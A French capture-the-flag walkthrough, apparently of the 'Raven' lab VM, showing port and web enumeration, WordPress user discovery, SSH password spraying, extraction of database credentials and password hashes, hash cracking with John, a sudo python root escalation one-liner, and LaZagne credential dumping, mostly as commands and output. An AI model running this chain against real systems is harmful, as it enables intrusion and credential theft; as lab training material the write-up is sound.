1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.154
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.154...100%
[+] Scan Nmap 192.168.56.154...100%
 
[+] 111/tcp open
[+] 80/tcp open
[+] 22/tcp open
[+] 34965/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.154-tcp.html     |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">👊</span> Gobuster**

Allons voir ce qui se cache sur ce serveur web

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.154 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.154
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 314] [--> http://192.168.56.154/css/]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.56.154/fonts/]
/img                  (Status: 301) [Size: 314] [--> http://192.168.56.154/img/]
/index.html           (Status: 200) [Size: 16819]
/js                   (Status: 301) [Size: 313] [--> http://192.168.56.154/js/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.56.154/manual/]
/server-status        (Status: 403) [Size: 302]
/vendor               (Status: 301) [Size: 317] [--> http://192.168.56.154/vendor/]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.56.154/wordpress/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

&nbsp;

**<span style="color: #dddddd;">💯</span> WPScan**

Énumération des utilisateur de `wordpress`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $wpscan --url http://192.168.56.154/wordpress/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.154/wordpress/ [192.168.56.154]
[+] Started: Fri Mar 14 22:59:23 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.154/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.154/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.154/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.56.154/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.56.154/wordpress/, Match: 'WordPress 4.8.7'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] michael
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Mar 14 22:59:33 2025
[+] Requests Done: 51
[+] Cached Requests: 4
[+] Data Sent: 12.713 KB
[+] Data Received: 285.401 KB
[+] Memory used: 155.66 MB
[+] Elapsed time: 00:00:09

```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Test des utilisateur `steven` & `michael` comme mot passe en `SSH`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.154 -u users.txt -p users.txt
SSH         192.168.56.154  22     192.168.56.154   [*] SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u4
SSH         192.168.56.154  22     192.168.56.154   [-] steven:steven
SSH         192.168.56.154  22     192.168.56.154   [-] michael:steven
SSH         192.168.56.154  22     192.168.56.154   [-] steven:michael
SSH         192.168.56.154  22     192.168.56.154   [+] michael:michael  Linux - Shell access!
```

&nbsp;

**🤖 Linpeas**

Mot de passe `root` de `sql` trouver

```
michael@Raven:~$ sh linpeas.sh

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3134 Aug 13  2018 /var/www/html/wordpress/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');

```

&nbsp;

**<span style="color: #dddddd;">🚔</span> Mysql**

Test de l’identifiant  `root` trouver précédemment

```
michael@Raven:~$ mysql -u root -p 'wordpress' -h 127.0.0.1
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 18235
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

&nbsp;

Hash des utilisateurs

```
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
2 rows in set (0.00 sec)
```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack du hash de utilisateur `steven`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $john steven --wordlist=Desktop/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
pink84           (steven)     
1g 0:00:00:06 DONE (2025-03-14 23:32) 0.1636g/s 7502p/s 7502c/s 7502C/s robert8..padangat
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

┌─[parrot@parrot]─[~/Documents]
└──╼ $john --show steven 
steven:pink84

1 password hash cracked, 0 left

```

&nbsp;

En regardant sur `GTFObin` j’ai pu devenir root avec python sans mot de passe

```
steven@Raven:~$ sudo -l
Matching Defaults entries for steven on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
steven@Raven:~$ sudo python -c 'import os; os.system("/bin/bash")'
root@Raven:/home/steven# 
```

&nbsp;

**<span style="color: #dddddd;">👾</span> LaZagne**

Voyons si lazagne trouve des mot de passe

```
root@Raven:/home/steven/LaZagne-2.4.6/Linux# python2 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: steven
Hash: $6$EO2N8zNr$XtF0bTljrXXp5jkG6kA/JtqqAquoy7KK3a1nMLHtUacpItshheyPtd4j36dildZ5JKlO8T709DOEYtcDuY.6l/:17756:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$rFGuQUz8$02awL8e4/jdcf3NSYRv/7pDY.gmiLLspy5j/LhVuCNb0IjGUU22TyfrWAEdYNkEE.kRjTJAC7jfD.eAmlooxJ.:17756:0:99999:7:::

[+] Password found !!!
Login: michael
Password: michael

------------------- Mimipy passwords -----------------

[+] Password found !!!
Process: /usr/sbin/sshd
Login: michael
Password: michael

[+] Password found !!!
Process: /usr/sbin/sshd
Login: steven
Password: pink84


[+] 5 passwords have been found.
For more information launch it again with the -v option

elapsed time = 5.26275587082
```

&nbsp;

Identifiant trouver

| Users | Password |
| --- | --- |
| steven | pink84 |
| michael | michael |